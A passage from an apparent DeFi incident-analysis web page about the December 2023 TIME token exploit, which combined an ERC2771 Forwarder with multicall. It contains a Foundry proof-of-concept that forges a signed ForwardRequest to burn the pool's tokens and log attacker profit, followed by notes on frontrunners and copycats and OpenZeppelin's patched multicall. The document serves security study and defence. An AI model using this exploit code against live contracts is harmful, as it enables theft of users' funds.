+</span><span id="__span-5-24"><a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a><span class="w">    </span><span class="kt">bytes32</span><span class="w"> </span><span class="nv">TYPEHASH</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">keccak256</span><span class="p">(</span><span class="s2">&quot;ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,bytes data)&quot;</span><span class="p">);</span>
+</span><span id="__span-5-25"><a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a><span class="w">    </span>Forwarder<span class="p">.</span>ForwardRequest<span class="w"> </span><span class="kt">memory</span><span class="w"> </span>req<span class="w"> </span><span class="o">=</span><span class="w"> </span>Forwarder<span class="p">.</span>ForwardRequest<span class="p">({</span>
+</span><span id="__span-5-26"><a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a><span class="w">        </span>from<span class="o">:</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span>addr<span class="p">),</span>
+</span><span id="__span-5-27"><a id="__codelineno-5-27" name="__codelineno-5-27" href="#__codelineno-5-27"></a><span class="w">        </span>to<span class="o">:</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span>time<span class="p">),</span>
+</span><span id="__span-5-28"><a id="__codelineno-5-28" name="__codelineno-5-28" href="#__codelineno-5-28"></a><span class="w">        </span>value<span class="o">:</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">,</span>
+</span><span id="__span-5-29"><a id="__codelineno-5-29" name="__codelineno-5-29" href="#__codelineno-5-29"></a><span class="w">        </span>gas<span class="o">:</span><span class="w"> </span><span class="err">5</span>e6<span class="p">,</span>
+</span><span id="__span-5-30"><a id="__codelineno-5-30" name="__codelineno-5-30" href="#__codelineno-5-30"></a><span class="w">        </span>nonce<span class="o">:</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">,</span>
+</span><span id="__span-5-31"><a id="__codelineno-5-31" name="__codelineno-5-31" href="#__codelineno-5-31"></a><span class="w">        </span>data<span class="o">:</span><span class="w"> </span>multicallData
+</span><span id="__span-5-32"><a id="__codelineno-5-32" name="__codelineno-5-32" href="#__codelineno-5-32"></a><span class="w">    </span><span class="p">});</span>
+</span><span id="__span-5-33"><a id="__codelineno-5-33" name="__codelineno-5-33" href="#__codelineno-5-33"></a><span class="w">    </span><span class="c1">// construct signature</span>
+</span><span id="__span-5-34"><a id="__codelineno-5-34" name="__codelineno-5-34" href="#__codelineno-5-34"></a><span class="w">    </span><span class="kt">bytes32</span><span class="w"> </span><span class="nv">structHash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">keccak256</span><span class="p">(</span>abi<span class="p">.</span>encode<span class="p">(</span>TYPEHASH<span class="p">,</span><span class="w"> </span>req<span class="p">.</span>from<span class="p">,</span><span class="w"> </span>req<span class="p">.</span>to<span class="p">,</span><span class="w"> </span>req<span class="p">.</span>value<span class="p">,</span><span class="w"> </span>req<span class="p">.</span>gas<span class="p">,</span><span class="w"> </span>req<span class="p">.</span>nonce<span class="p">,</span><span class="w"> </span><span class="nb">keccak256</span><span class="p">(</span>req<span class="p">.</span>data<span class="p">)));</span>
+</span><span id="__span-5-35"><a id="__codelineno-5-35" name="__codelineno-5-35" href="#__codelineno-5-35"></a><span class="w">    </span><span class="kt">bytes32</span><span class="w"> </span><span class="nv">_CACHED_DOMAIN_SEPARATOR</span><span class="o">=</span><span class="w"> </span>hex<span class="s2">&quot;7ce8d495cdbd0e4deb3abed5528be0aca8dae1c9f4172364ceec32c5051da6b8&quot;</span><span class="p">;</span>
+</span><span id="__span-5-36"><a id="__codelineno-5-36" name="__codelineno-5-36" href="#__codelineno-5-36"></a><span class="w">    </span><span class="kt">bytes32</span><span class="w"> </span><span class="nv">messageHash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>ECDSA<span class="p">.</span>toTypedDataHash<span class="p">(</span>_CACHED_DOMAIN_SEPARATOR<span class="p">,</span><span class="w"> </span>structHash<span class="p">);</span>
+</span><span id="__span-5-37"><a id="__codelineno-5-37" name="__codelineno-5-37" href="#__codelineno-5-37"></a><span class="w">    </span><span class="p">(</span><span class="kt">uint8</span><span class="w"> </span><span class="nv">v</span><span class="p">,</span><span class="w"> </span><span class="kt">bytes32</span><span class="w"> </span><span class="nv">r</span><span class="p">,</span><span class="w"> </span><span class="kt">bytes32</span><span class="w"> </span><span class="nv">s</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w">  </span>vm<span class="p">.</span>sign<span class="p">(</span>privateKey<span class="p">,</span><span class="w"> </span>messageHash<span class="p">);</span>
+</span><span id="__span-5-38"><a id="__codelineno-5-38" name="__codelineno-5-38" href="#__codelineno-5-38"></a><span class="w">    </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">memory</span><span class="w"> </span>signature<span class="w"> </span><span class="o">=</span><span class="w"> </span>abi<span class="p">.</span>encodePacked<span class="p">(</span>r<span class="p">,</span><span class="w"> </span>s<span class="p">,</span><span class="w"> </span>v<span class="p">);</span>
+</span><span id="__span-5-39"><a id="__codelineno-5-39" name="__codelineno-5-39" href="#__codelineno-5-39"></a>
+</span><span id="__span-5-40"><a id="__codelineno-5-40" name="__codelineno-5-40" href="#__codelineno-5-40"></a><span class="w">    </span>forwarder<span class="p">.</span>execute<span class="p">(</span>req<span class="p">,</span><span class="w"> </span>signature<span class="p">);</span>
+</span><span id="__span-5-41"><a id="__codelineno-5-41" name="__codelineno-5-41" href="#__codelineno-5-41"></a><span class="w">    </span>time_weth<span class="p">.</span>sync<span class="p">();</span>
+</span><span id="__span-5-42"><a id="__codelineno-5-42" name="__codelineno-5-42" href="#__codelineno-5-42"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Pair TIME balance&quot;</span><span class="p">,</span><span class="w"> </span>time<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span>time_weth<span class="p">)),</span><span class="w"> </span>time<span class="p">.</span>decimals<span class="p">());</span>
+</span><span id="__span-5-43"><a id="__codelineno-5-43" name="__codelineno-5-43" href="#__codelineno-5-43"></a>
+</span><span id="__span-5-44"><a id="__codelineno-5-44" name="__codelineno-5-44" href="#__codelineno-5-44"></a><span class="w">    </span>TIMEToWETH<span class="p">();</span>
+</span><span id="__span-5-45"><a id="__codelineno-5-45" name="__codelineno-5-45" href="#__codelineno-5-45"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">wethBalanceAfter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>weth<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span>addr<span class="p">));</span>
+</span><span id="__span-5-46"><a id="__codelineno-5-46" name="__codelineno-5-46" href="#__codelineno-5-46"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;WETH balance after attack&quot;</span><span class="p">,</span><span class="w"> </span>wethBalanceAfter<span class="p">,</span><span class="w"> </span><span class="m m-Decimal">18</span><span class="p">);</span>
+</span><span id="__span-5-47"><a id="__codelineno-5-47" name="__codelineno-5-47" href="#__codelineno-5-47"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Attacker profit&quot;</span><span class="p">,</span><span class="w"> </span>wethBalanceAfter<span class="w"> </span><span class="o">-</span><span class="w"> </span>wethBalanceBefore<span class="p">,</span><span class="w"> </span><span class="m m-Decimal">18</span><span class="p">);</span>
+</span><span id="__span-5-48"><a id="__codelineno-5-48" name="__codelineno-5-48" href="#__codelineno-5-48"></a><span class="w">    </span>vm<span class="p">.</span>stopPrank<span class="p">();</span>
+</span><span id="__span-5-49"><a id="__codelineno-5-49" name="__codelineno-5-49" href="#__codelineno-5-49"></a><span class="p">}</span>
+</span><span id="__span-5-50"><a id="__codelineno-5-50" name="__codelineno-5-50" href="#__codelineno-5-50"></a>
+</span><span id="__span-5-51"><a id="__codelineno-5-51" name="__codelineno-5-51" href="#__codelineno-5-51"></a>
+</span><span id="__span-5-52"><a id="__codelineno-5-52" name="__codelineno-5-52" href="#__codelineno-5-52"></a><span class="kt">function</span><span class="w"> </span><span class="nv">WETHToTIME</span><span class="p">()</span><span class="w"> </span><span class="kt">internal</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-5-53"><a id="__codelineno-5-53" name="__codelineno-5-53" href="#__codelineno-5-53"></a><span class="w">    </span><span class="kt">address</span><span class="p">[]</span><span class="w"> </span><span class="kt">memory</span><span class="w"> </span>path<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">new</span><span class="w"> </span><span class="kt">address</span><span class="p">[](</span><span class="m m-Decimal">2</span><span class="p">);</span>
+</span><span id="__span-5-54"><a id="__codelineno-5-54" name="__codelineno-5-54" href="#__codelineno-5-54"></a><span class="w">    </span>path<span class="p">[</span><span class="m m-Decimal">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span>weth<span class="p">);</span>
+</span><span id="__span-5-55"><a id="__codelineno-5-55" name="__codelineno-5-55" href="#__codelineno-5-55"></a><span class="w">    </span>path<span class="p">[</span><span class="m m-Decimal">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span>time<span class="p">);</span>
+</span><span id="__span-5-56"><a id="__codelineno-5-56" name="__codelineno-5-56" href="#__codelineno-5-56"></a><span class="w">    </span>router<span class="p">.</span>swapExactTokensForTokensSupportingFeeOnTransferTokens<span class="p">(</span>
+</span><span id="__span-5-57"><a id="__codelineno-5-57" name="__codelineno-5-57" href="#__codelineno-5-57"></a><span class="w">        </span>weth<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span>addr<span class="p">)),</span>
+</span><span id="__span-5-58"><a id="__codelineno-5-58" name="__codelineno-5-58" href="#__codelineno-5-58"></a><span class="w">        </span><span class="m m-Decimal">0</span><span class="p">,</span>
+</span><span id="__span-5-59"><a id="__codelineno-5-59" name="__codelineno-5-59" href="#__codelineno-5-59"></a><span class="w">        </span>path<span class="p">,</span>
+</span><span id="__span-5-60"><a id="__codelineno-5-60" name="__codelineno-5-60" href="#__codelineno-5-60"></a><span class="w">        </span><span class="kt">address</span><span class="p">(</span>addr<span class="p">),</span>
+</span><span id="__span-5-61"><a id="__codelineno-5-61" name="__codelineno-5-61" href="#__codelineno-5-61"></a><span class="w">        </span><span class="k">block.timestamp</span>
+</span><span id="__span-5-62"><a id="__codelineno-5-62" name="__codelineno-5-62" href="#__codelineno-5-62"></a><span class="w">    </span><span class="p">);</span>
+</span><span id="__span-5-63"><a id="__codelineno-5-63" name="__codelineno-5-63" href="#__codelineno-5-63"></a><span class="p">}</span>
+</span><span id="__span-5-64"><a id="__codelineno-5-64" name="__codelineno-5-64" href="#__codelineno-5-64"></a>
+</span><span id="__span-5-65"><a id="__codelineno-5-65" name="__codelineno-5-65" href="#__codelineno-5-65"></a><span class="kt">function</span><span class="w"> </span><span class="nv">TIMEToWETH</span><span class="p">()</span><span class="w"> </span><span class="kt">internal</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-5-66"><a id="__codelineno-5-66" name="__codelineno-5-66" href="#__codelineno-5-66"></a><span class="w">    </span><span class="kt">address</span><span class="p">[]</span><span class="w"> </span><span class="kt">memory</span><span class="w"> </span>path<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">new</span><span class="w"> </span><span class="kt">address</span><span class="p">[](</span><span class="m m-Decimal">2</span><span class="p">);</span>
+</span><span id="__span-5-67"><a id="__codelineno-5-67" name="__codelineno-5-67" href="#__codelineno-5-67"></a><span class="w">    </span>path<span class="p">[</span><span class="m m-Decimal">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span>time<span class="p">);</span>
+</span><span id="__span-5-68"><a id="__codelineno-5-68" name="__codelineno-5-68" href="#__codelineno-5-68"></a><span class="w">    </span>path<span class="p">[</span><span class="m m-Decimal">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span>weth<span class="p">);</span>
+</span><span id="__span-5-69"><a id="__codelineno-5-69" name="__codelineno-5-69" href="#__codelineno-5-69"></a><span class="w">    </span>router<span class="p">.</span>swapExactTokensForTokensSupportingFeeOnTransferTokens<span class="p">(</span>
+</span><span id="__span-5-70"><a id="__codelineno-5-70" name="__codelineno-5-70" href="#__codelineno-5-70"></a><span class="w">        </span>time<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span>addr<span class="p">)),</span>
+</span><span id="__span-5-71"><a id="__codelineno-5-71" name="__codelineno-5-71" href="#__codelineno-5-71"></a><span class="w">        </span><span class="m m-Decimal">0</span><span class="p">,</span>
+</span><span id="__span-5-72"><a id="__codelineno-5-72" name="__codelineno-5-72" href="#__codelineno-5-72"></a><span class="w">        </span>path<span class="p">,</span>
+</span><span id="__span-5-73"><a id="__codelineno-5-73" name="__codelineno-5-73" href="#__codelineno-5-73"></a><span class="w">        </span><span class="kt">address</span><span class="p">(</span>addr<span class="p">),</span>
+</span><span id="__span-5-74"><a id="__codelineno-5-74" name="__codelineno-5-74" href="#__codelineno-5-74"></a><span class="w">        </span><span class="k">block.timestamp</span>
+</span><span id="__span-5-75"><a id="__codelineno-5-75" name="__codelineno-5-75" href="#__codelineno-5-75"></a><span class="w">    </span><span class="p">);</span>
+</span><span id="__span-5-76"><a id="__codelineno-5-76" name="__codelineno-5-76" href="#__codelineno-5-76"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>After buying TIME tokens, the attacker first constructed malicious <code>multicall</code> invocation data, then crafted the corresponding ForwardRequest, followed by constructing the message hash and signing it. They then forwarded the execution message through the Forwarder, burning almost all TIME tokens in the pool, driving up the price before exchanging their TIME tokens for ETH to profit.</p>
+<p>However, because the original attack did not burn all TIME tokens in the Pair to drain it, it was attacked again approximately 5 hours later. In this <a href="https://phalcon.blocksec.com/explorer/tx/eth/0x1911be7020af964e35abfe5a94c9f2a232cc017532c1c14a1dea57c6ac011af3">attack</a>, the attacker directly made the Pair transfer a large amount of tokens to them by constructing a malicious ForwardRequest, then exchanged them for ETH to profit.</p>
+<h3 id="attack-flow">Attack Flow</h3>
+<p>It is apparent that the actual attacker behind the attack was <a href="https://etherscan.io/address/0xfde0d1575ed8e06fbf36256bcdfa1f359281455a">frontrunner</a>, who directly copied the attack invocation from the <a href="https://etherscan.io/address/0xa16a5f37774309710711a8b4e83b068306b21724">original attacker</a> (<code>req.from</code> is the original attacker).</p>
+<p><img alt="" src="../../image/231206_TIME.assets/3212.png" /></p>
+<p>The original attacker transferred about 0.5 ETH from an address (possibly used for a mixing service) on the afternoon of December 6. Then in the evening, they created an attack contract against the <a href="https://etherscan.io/address/0x4b0e9a7da8bab813efae92a6651019b8bd6c0a29">TIME token</a>, but before they could launch the transaction, they were immediately frontrun by frontrunner (in the next block after the contract creation).</p>
+<p>Two hours later, they created an attack contract against the <a href="https://etherscan.io/address/0xe62be16aa3c50bafb1855b4ded7799d9150bb1a1">Dyl token</a>, but once again, they were frontrun by <a href="https://phalcon.blocksec.com/explorer/tx/eth/0xc7df7e7bc537785b9068f4d6356caba3b16df1b6054927314724a9b2e49ab18b">frontrunner</a>.</p>
+<p>Half a day later, they created an attack contract against the <a href="https://etherscan.io/address/0x677da32f1e790826995be40f1bc7fdda5f3b6999">PCOIN token</a> and launched the attack.</p>
+<p><img alt="" src="../../image/231206_TIME.assets/2021.png" /></p>
+<p>However, due to the error in the attack logic, this attack failed.</p>
+<p>Half a month later, the attacker transferred the remaining funds to <a href="https://etherscan.io/address/0x9e985990c8ce0ac5788cac30d0d1bfb3e48fcd9a">another address</a>.</p>
+<p><img alt="" src="../../image/231206_TIME.assets/5039.png" /></p>
+<p>They then created a token called BEACH and its corresponding pair, and added liquidity.</p>
+<p>However, the BEACH token was attacked by <a href="https://etherscan.io/tx/0x729f771117a5016c27ccf7197fa91ac86232e9c78c8d8b030ec13836444feced">another attacker</a> two days later, due to the <code>burn</code> function being public.</p>
+<h2 id="misc">Misc</h2>
+<h3 id="copycat">Copycat</h3>
+<p>In addition to the original attack, which was copied by others due to the remaining funds, there were many attacks targeting the same vulnerability. For example, there were several attempts by the original attacker to launch further attacks.</p>
+<p><img alt="" src="../../image/231206_TIME.assets/0307.png" /></p>
+<p>The attack on the PCOIN token failed due to the attack logic error, but shortly after, another <a href="https://etherscan.io/address/0xDFa0E64dA6924bFC3889a556ce33B42816DC681d">copycat</a> launched an attack against the token.</p>
+<p>Checking this address reveals that it has launched other attacks as well.</p>
+<p><img alt="" src="../../image/231206_TIME.assets/1456.png" /></p>
+<p>The attacker claimed to be thankful for the teachings of BlockSec and claimed to be a whitehat who would return the funds.</p>
+<p><img alt="" src="../../image/231206_TIME.assets/1605.png" /></p>
+<p>However, several months later, some funds were transferred to Tornado Cash, which is somewhat suspicious.</p>
+<h3 id="patch">Patch</h3>
+<p>OpenZeppelin subsequently updated the implementation of the <code>multicall</code> function to avoid this kind of vulnerability. The current implementation is as follows:</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="cm">/*</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="cm"> * NOTE: Since 5.0.1 and 4.9.4, this contract identifies non-canonical contexts (i.e. `msg.sender` is not {_msgSender}).</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="cm"> * If a non-canonical context is identified, the following self `delegatecall` appends the last bytes of `msg.data`</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="cm"> * to the subcall. This makes it safe to use with {ERC2771Context}. Contexts that don&#39;t affect the resolution of</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="cm"> * {_msgSender} are not propagated to subcalls.</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="cm"> */</span>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="kt">function</span><span class="w"> </span><span class="nv">multicall</span><span class="p">(</span><span class="kt">bytes</span><span class="p">[]</span><span class="w"> </span>calldata<span class="w"> </span>data<span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span>virtual<span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">bytes</span><span class="p">[]</span><span class="w"> </span><span class="kt">memory</span><span class="w"> </span>results<span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="w">    </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">memory</span><span class="w"> </span>context<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">msg.sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>_msgSender<span class="p">()</span>
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="w">        </span><span class="o">?</span><span class="w"> </span><span class="kt">new</span><span class="w"> </span><span class="kt">bytes</span><span class="p">(</span><span class="m m-Decimal">0</span><span class="p">)</span>
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="w">        </span><span class="o">:</span><span class="w"> </span><span class="k">msg.data</span><span class="p">[</span><span class="k">msg.data</span><span class="p">.</span>length<span class="w"> </span><span class="o">-</span><span class="w"> </span>_contextSuffixLength<span class="p">()</span><span class="o">:</span><span class="p">];</span>
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>
+</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="w">    </span>results<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">new</span><span class="w"> </span><span class="kt">bytes</span><span class="p">[](</span>data<span class="p">.</span>length<span class="p">);</span>
+</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="w">    </span><span class="kt">for</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">;</span><span class="w"> </span>i<span class="w"> </span><span class="o">&lt;</span><span class="w"> </span>data<span class="p">.</span>length<span class="p">;</span><span class="w"> </span>i<span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a><span class="w">        </span>results<span class="p">[</span>i<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Address<span class="p">.</span>functionDelegateCall<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span><span class="kt">bytes</span><span class="p">.</span>concat<span class="p">(</span>data<span class="p">[</span>i<span class="p">],</span><span class="w"> </span>context<span class="p">));</span>
+</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a><span class="w">    </span><span class="kt">return</span><span class="w"> </span>results<span class="p">;</span>
+</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>This implementation ensures that in the <code>delegatecall</code> invocation of <code>multicall</code>, the last 20 bytes are still <code>req.from</code>, correctly identifying the <code>msgSender</code>.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../231018_MicDao/" class="md-footer__link md-footer__link--prev" aria-label="Previous: 231018-MicDao">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                231018-MicDao
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../../2024/240415_ChaingeFinance/" class="md-footer__link md-footer__link--next" aria-label="Next: 240415-ChaingeFinance">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                240415-ChaingeFinance
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.footer", "content.code.copy", "search.suggest", "search.highlight", "search.share"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+        <script src="../../javascripts/katex.js"></script>
+      
+        <script src="https://unpkg.com/katex@0/dist/katex.min.js"></script>
+      
+        <script src="https://unpkg.com/katex@0/dist/contrib/auto-render.min.js"></script>
+      
+    
+  </body>
+</html>
